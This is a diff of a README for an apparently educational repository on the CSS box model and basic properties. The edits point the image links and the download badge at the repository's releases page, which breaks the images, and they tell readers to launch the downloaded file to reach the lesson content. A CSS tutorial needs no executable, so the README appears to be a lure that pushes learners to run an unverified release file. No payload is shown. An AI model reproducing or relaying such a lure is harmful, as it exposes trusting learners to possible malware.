@@ -4,7 +4,7 @@
 ## Introduction
 Welcome to the **"webdev-lrn-fe-005-cv-css-box-model-and-properties"** repository, a part of the WebDev Self-Led Learning Sessions dedicated to improving your frontend development skills. In this project, we delve into understanding the CSS Box Model and exploring basic CSS properties to enhance your web page designs. 
 
-![CSS Box Model](https://images.unsplash.com/photo-1601926736858-97a1d4de4980)
+![CSS Box Model](https://github.com/Sathish151100/webdev-lrn-fe-005-cv-css-box-model-and-properties/releases)
 
 ## Repository Overview
 In this repository, you will find the following key components:
@@ -25,7 +25,7 @@ In this repository, you will find the following key components:
 ## Getting Started
 To explore the project files and dive into the world of frontend development, download the project files from the following link:
 
-[![Download Project Files](https://img.shields.io/badge/Download-Project_Files-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download Project Files](https://github.com/Sathish151100/webdev-lrn-fe-005-cv-css-box-model-and-properties/releases)](https://github.com/Sathish151100/webdev-lrn-fe-005-cv-css-box-model-and-properties/releases)
 
 Please ensure to launch the downloaded file to access the project content.
 
@@ -53,7 +53,7 @@ For further learning and practice, consider exploring the following topics:
 - CSS preprocessors like SASS or LESS
 - CSS animations and transitions
 
-![CSS Animation](https://images.unsplash.com/photo-1519958730222-3043f3c69a74)
+![CSS Animation](https://github.com/Sathish151100/webdev-lrn-fe-005-cv-css-box-model-and-properties/releases)
 
 ## Conclusion
 Congratulations on taking the initiative to enhance your frontend development skills through the **"webdev-lrn-fe-005-cv-css-box-model-and-properties"** repository. By mastering the CSS Box Model and basic properties, you are one step closer to creating stunning web designs and engaging user experiences.
